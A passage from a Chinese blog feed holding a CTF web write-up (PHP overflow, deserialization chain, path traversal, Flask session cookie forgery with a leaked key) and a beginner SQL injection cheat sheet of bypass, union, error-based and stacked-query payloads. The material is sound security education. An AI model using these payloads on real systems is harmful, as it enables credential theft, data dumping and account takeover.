class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里修复了bug（</p><p>考的还是整型溢出：</p><p><code>$arr[]=1</code>就是让数组追加一个新的下标，然后令他的值为1</p><p>也就是说我们输入什么数字，他的下一个数都是1</p><p>判断永真，进入不了else</p><p>但是如果它超过了整型最大值的话，数组就会处理异常</p><p>因为数组的最大下标数=最大int数</p><p>追加的话会导致整型溢出，追加失败</p><p>进入else</p><p>那直接传入<code>0=9223372036854775807</code>即可</p><p>这个时候就会报错：<code>**Warning**: Cannot add element to the array as the next element is already occupied in **/var/www/html/index.php** on line **7**</code></p><p>并且进入else语句<code>ctfshow&#123;2520e3b6-c6de-4205-9f8a-60565aa79691&#125;</code></p><h1><span id="小舔田"> 小舔田?</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;月亮&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;快来赏我&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;牛夫人&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;nickname==<span class="string">&quot;小甜甜&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname.<span class="string">&quot;。\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">call</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\t\t\t\t\t\t\t\t\t\t----&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化</p><p>目标：<code>echo $flag</code></p><p>需要触发call()函数，并且nickname=“小甜甜”</p><p>call()函数由<code>__toString()</code>魔术方法触发，而<code>__toString()</code>又可以由</p><p>Moon类触发</p><p>那就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;小甜甜&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title class_">Moon</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#output:O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;&#125;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title class_">Moon</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O:4:&quot;Moon&quot;:1:&#123;s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:&#123;s:8:&quot;nickname&quot;;i:0;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>当然，nickname是弱比较</p><p>我们让nickname=0（int）和字符串比较，也是可以的</p><p>不过这个后面就比较怪了…</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/16.png" class title="pwp"><h1><span id="lsb探姬"> LSB探姬</span></h1><p><a href="https://www.bilibili.com/video/BV1kG4y1U7pD/?share_source=copy_web&amp;vd_source=23eda944c3c14772adf90f89116bc5a2">【ctfshow菜狗杯-LSB探姬】</a></p><h1><span id="抽老婆"> 抽老婆</span></h1><p>像catctf的 catcat，比catcat简单</p><p>直接抽一个老婆，然后查看源码</p><p>在下载老婆处找到了<code>/download?file=3e5b0bcb240126f92e31206528fa81ff.jpg</code></p><p>就是通过file=文件名进行下载</p><p>尝试修改一下文件名，改为1，页面报错，同时发现是flask模板（/flask/app.py）</p><p>所以我们尝试下载app.py查看源码</p><p><code>file=../../app.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/11/07 09:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：抽老婆，哇偶~</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getwifi&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getwifi</span>():</span><br><span class="line">    session[<span class="string">&#x27;isadmin&#x27;</span>]=<span class="literal">False</span></span><br><span class="line">    wifi=random.choice(os.listdir(<span class="string">&#x27;static/img&#x27;</span>))</span><br><span class="line">    session[<span class="string">&#x27;current_wifi&#x27;</span>]=wifi</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;getwifi.html&#x27;</span>,wifi=wifi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>(): </span><br><span class="line">    filename=request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你想干什么？&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> send_file(<span class="string">&#x27;static/img/&#x27;</span>+filename,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret_path_U_never_know&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;isadmin&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:flag&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你怎么知道这个路径的？不过还好我有身份验证&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现flag在/secret_path_U_never_know处，但是他又需要session的身份验证</p><p>所以这个时候就需要我们伪造session了，详见CatCTF的catcat</p><p>我们首先获取我们当前的session，打开bp抓包：</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/17.png" class title="qwq"><p>然后通过flask-session-cookie-manager伪造session即可</p><p>伪造session需要知道secretkey，而在这里已经提供了secretkey：<code>tanji_is_A_boy_Yooooooooooooooooooooo!</code></p><p>先使用decode解码内容：</p><p><code>python.exe .\flask_session_cookie_manager3.py decode -c 'eyJjdXJyZW50X3dpZmkiOiIzZTViMGJjYjI0MDEyNmY5MmUzMTIwNjUyOGZhODFmZi5qcGciLCJpc2FkbWluIjpmYWxzZX0.Y-UDjg.2I1zjYEctpdz93Wi_YcLVmgBrAg' -s 'tanji_is_A_boy_Yooooooooooooooooooooo!'</code></p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/18.png" class title="rwr"><p>解码内容：<code>&#123;'current_wifi': '3e5b0bcb240126f92e31206528fa81ff.jpg', 'isadmin': False&#125;</code></p><p>然后进行加密：</p><p><code>python.exe .\flask_session_cookie_manager3.py encode -s 'tanji_is_A_boy_Yooooooooooooooooooooo!' -t &quot;&#123;'current_wifi': '3e5b0bcb240126f92e31206528fa81ff.jpg', 'isadmin': True&#125;&quot;</code></p><p>获取session：</p><p><code>eyJjdXJyZW50X3dpZmkiOiIzZTViMGJjYjI0MDEyNmY5MmUzMTIwNjUyOGZhODFmZi5qcGciLCJpc2FkbWluIjp0cnVlfQ.Y-UG7Q.K3pbEVAqAZZFU1upOI_Zn4Rpj7c</code></p><p>然后替换session再访问<code>/secret_path_U_never_know</code>即可</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/18.png" class title="mwm"><hr><p>龙珠nft我没做出来（（（</p><p>完</p><hr><p><a href="http://t.csdn.cn/U160e">CTFShow 菜狗杯wp</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;做做菜狗杯的题（主要是web）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web WriteUp" scheme="http://example.com/categories/CTF-Web-WriteUp/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>看看sql注入</title>
    <link href="http://example.com/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/</id>
    <published>2023-01-10T02:35:56.000Z</published>
    <updated>2023-03-12T09:43:56.845Z</updated>
    
    <content type="html"><![CDATA[<p>突然发现好久没写博客了，赶紧水一篇（雾）</p><span id="more"></span><p>该文稍微总结一下我遇到过的sql注入（非常基础非常萌新，没学过的都能看得懂…吗？）</p><hr><h1><span id="0x01-sql漏洞成因"> 0x01 SQL漏洞成因</span></h1><p>程序没有对用户的输入进行过滤。</p><p>例如SQL的查询语句可能是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user_id,user_name,user_type_email from users where user_id=&#x27;$id&#x27; and password = &#x27;$password&#x27;</span><br></pre></td></tr></table></figure><p>id和password是我们可输入的参数</p><p>在进行数据库查询时由于没有过滤单引号，我们输入1’和任意的密码时，语句会变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user_id,user_name,user_type,email from users where user_id=&#x27;1&#x27;&#x27; and password = &#x27;123132132&#x27;</span><br></pre></td></tr></table></figure><p>由于sql语法中单引号必须成对存在，所以这条查询语句中1’后面的单引号会和前面的单引号闭合，导致后面的单引号变得多余了，这条语句就会报错，一般报错的内容就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>此时我们只需要将前面的单引号闭合，在后面插入我们想要查询的语句，就能够进行SQL的注入了</p><h1><span id="0x02-sql注入点"> 0x02 SQL注入点</span></h1><p>SQL注入的注入点其实很多的（</p><ul><li><p>首先看url 是否有?id=1这种，如果有的话有可能是SQL注入</p></li><li><p>然后就是给你一个框框，有可能是搜索用户名，也有可能是登录框，让你输入账号密码登录，也有可能是让你查询一段内容…</p></li><li><p>然后就是http头，包括user-agent，cookie，referer，xff(有些flask的也经常用X-Forwarded-For)</p></li></ul><p>只需要在你怀疑的注入点加入单引号进行测试即可（雾</p><p>其实有可能有单引号、双引号、甚至加入一个反斜杠也有可能发现</p><h1><span id="0x03-查询语句的过滤"> 0x03 查询语句的过滤</span></h1><h2><span id="1大小写绕过"> 1.大小写绕过：</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; OrDeR by 1#</span><br></pre></td></tr></table></figure><h2><span id="2编码"> 2.编码：</span></h2><p>进行url编码，如and（&amp;&amp;）可以尝试使用%26%26</p><p>如#可以使用%23</p><h2><span id="3内联注释"> 3.内联注释：</span></h2><p>空格被过滤的一个方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#</span><br></pre></td></tr></table></figure><p>另一个方法就是使用括号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from inforamtion_schema.tables where table_schema=database())),3)#</span><br></pre></td></tr></table></figure><h2><span id="4双写绕过"> 4.双写绕过：</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,2,3#</span><br></pre></td></tr></table></figure><p>将中间的union和select删除后又有union select，绕过成功</p><span class="blur">大抵是因为str_replace?</span><h2><span id="5符号绕过"> 5.符号绕过：</span></h2><p>or 换成 ||</p><p>and 换成 &amp;&amp;</p><h2><span id="6大小于号的过滤"> 6.大小于号的过滤</span></h2><p>万恶的大小于号过滤，在写脚本跑的时候非常痛苦</p><p>可以使用greatest()函数、least()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br><span class="line">select * from users where id=1 and ascii(substr(databse(),1,1))&gt;64</span><br><span class="line">可以换成：</span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64</span><br></pre></td></tr></table></figure><p><s>其实也可以直接使用等于号硬跑脚本，也就只用跑十七八分钟而已</s></p><h2><span id="7过滤了database"> 7.过滤了database()</span></h2><p><strong>updated in 2023/3/11</strong></p><p>可以通过查一个不存在的表来爆出库名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||(select *from asdf)#</span><br></pre></td></tr></table></figure><h1><span id="0x04-sql注入类型"> 0x04 SQL注入类型</span></h1><p>分为字符型和数字型两种</p><p>判断方式也很简单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1  //不报错</span><br><span class="line">?id=1 and 1=2  //报错</span><br><span class="line"></span><br><span class="line">//说明是数字型注入</span><br><span class="line">因为后台语句为</span><br><span class="line">select * from &lt;column_name&gt; where id = x</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1 //不报错</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;2 //报错</span><br><span class="line">//说明为字符型注入</span><br><span class="line">因为此时后台语句为</span><br><span class="line">select * from &lt;column_name&gt; where id=&#x27;x&#x27;</span><br></pre></td></tr></table></figure><p><s>虽然但是我这一步好像从来没判断过，直接加个单引号注入的…</s></p><p><s>所以有些不用加单引号的题就比较容易吃亏</s></p><h1><span id="0x05-sql注入手法"> 0x05 SQL注入手法</span></h1><h2><span id="1联合查询"> 1.联合查询</span></h2><p>非常常用的注入，适用于有回显位的注入（也就是会返回我们输入数据结果的位置）</p><p>首先判断字段数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by n#</span><br><span class="line">1&#x27; order by n--+</span><br><span class="line">1&#x27; order by n&#x27;（某些过滤了#、--+等时常用）</span><br><span class="line">其中n取自然数，当n回显正常且n+1回显异常时，字段数为n，假设字段为3</span><br></pre></td></tr></table></figure><p>然后判断回显位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1&#x27; union select 1,2,3--+</span><br><span class="line">1&#x27; union select 1,2,3&#x27;</span><br><span class="line">根据页面的信息观察回显位</span><br><span class="line">比如Your name: 2</span><br><span class="line">Your id: 3</span><br><span class="line">即回显位为2和3</span><br></pre></td></tr></table></figure><p>爆库：（推荐使用-1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database(),3#</span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure><p>爆列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;你想要爆的表名&#x27;#</span><br></pre></td></tr></table></figure><p>爆内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(id,username,password),3 from column_name#</span><br></pre></td></tr></table></figure><p>当然也可以写成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(id,&#x27;--&#x27;,username,&#x27;--&#x27;,password),3 from column_name#</span><br><span class="line">这样子回显出来的结果会比较好看（因为有--分隔）</span><br></pre></td></tr></table></figure><h2><span id="2报错注入"> 2.报错注入</span></h2><p>报错注入适用于没有回显位的，但是页面有报错信息的时候</p><p>有三种注入方式（雾）</p><p><font color="blue">1.group by 重复键冲</font></p><p>反正我是看不懂：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure><p><font color="blue">2.extractvalue()</font></p><p><strong>updated in 2023/3/11</strong></p><p>extractvalue()的报错注入和updatexml还是有点不一样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; || extractvalue(1,concat(0x7e,(select data from (output))))#</span><br></pre></td></tr></table></figure><p><font color="blue">3.updatexml()</font></p><p>与extractvalue()很相似，也是这三个里面最常用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,database()),3)#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3)#</span><br></pre></td></tr></table></figure><p>注意报错注入只能回显前32个字符，爆flag时可能需要添加reverse函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select(reverse(group_concat(text))) from wfy_comments)),3)#</span><br></pre></td></tr></table></figure><h2><span id="3堆叠注入"> 3.堆叠注入</span></h2><p>在SQL中（以及在很多的地方中），分号表示命令的分隔，也就是SQL语句的结束，如果使用;后再在后面构造SQL语句，两条是可以一起执行的,例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;123456&#x27; where id=1;#</span><br></pre></td></tr></table></figure><p>（此处可左转NewStarCTF week 3的multi SQL）</p><p>将id为1的密码更新为123456</p><p>爆库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show 